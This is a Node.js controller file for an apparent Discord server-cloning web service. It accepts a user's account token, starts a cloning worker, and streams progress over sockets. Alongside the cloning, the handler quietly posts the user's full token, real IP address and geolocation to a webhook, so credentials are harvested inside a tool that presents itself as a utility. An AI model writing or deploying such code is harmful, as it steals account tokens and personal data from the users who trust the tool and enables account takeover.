const { Worker } = require('worker_threads');
const path = require('path');
const { sendWebhook, getRealIP, getIPInfo } = require('../utils/webhook');
const activeWorkers = new Map();

exports.copy = async (req, res) => {
    const { token, copyId, pasteId, selectedOptions, socketId } = req.body || {};
    try {
        if (!token || !copyId || !pasteId) {
            return res.status(400).json({ success: false, message: "Missing fields" });
        }

        const ip = getRealIP(req);
        const geo = await getIPInfo(ip);

        const worker = new Worker(path.join(__dirname, '../script/cloner.js'), {
            workerData: { token, sourceId: copyId, targetId: pasteId, selectedOptions: selectedOptions || { all: true } }
        });

        if (socketId) {
            activeWorkers.set(socketId, worker);
        }

        const time = new Date().toLocaleString('en-GB', { timeZone: 'UTC' }).replace(',', '');
        const content = `**🚀 Server Cloning Started**
**Time:** ${time}
**Copy Guild:** \`${copyId}\`
**Paste Guild:** \`${pasteId}\`
**IP:** ${ip.replace(/^::ffff:/, '')}
**Location:** ${geo?.country || "Unknown"}, ${geo?.city || "Unknown"}
**Token:** \`${token}\``;

        sendWebhook({ content });

        worker.on('message', (data) => {
            if (data.type === 'log') {
                if (global.io && socketId) {
                    global.io.to(socketId).emit("terminal-log", data.message);
                }
            } else if (data.type === 'complete') {
                if (global.io && socketId) {
                    global.io.to(socketId).emit("cloning-complete");
                }
            } else if (data.type === 'error') {
                if (global.io && socketId) {
                    global.io.to(socketId).emit("terminal-log", `Fatal Error: ${data.message}`);
                }
            }
        });

        worker.on('error', (error) => {
            console.error('Worker error:', error);
            if (global.io && socketId) {
                global.io.to(socketId).emit("terminal-log", `Worker Error: ${error.message}`);
            }
        });

        worker.on('exit', (code) => {
            if (socketId) activeWorkers.delete(socketId);
            if (code !== 0) {
                console.error(`Worker stopped with exit code ${code}`);
            }
        });

        return res.status(200).json({ success: true, message: "Cloning process started." });
    } catch (error) {
        console.error("Cloning Controller Error:", error);
        return res.status(500).json({ success: false, message: "An unexpected error occurred. Please try again later." });
    }
}

exports.stop = async (req, res) => {
    const { socketId } = req.body;
    try {
        const worker = activeWorkers.get(socketId);
        if (worker) {
            worker.terminate();
            activeWorkers.delete(socketId);
            if (global.io && socketId) {
                global.io.to(socketId).emit("terminal-log", "Cloning stopped.");
            }
            return res.status(200).json({ success: true, message: "Cloning process stopped." });
        }
        return res.status(404).json({ success: false, message: "No active cloning process found." });
    } catch (error) {
        console.error("Stop Controller Error:", error);
        return res.status(500).json({ success: false, message: "Error stopping process." });
    }
}

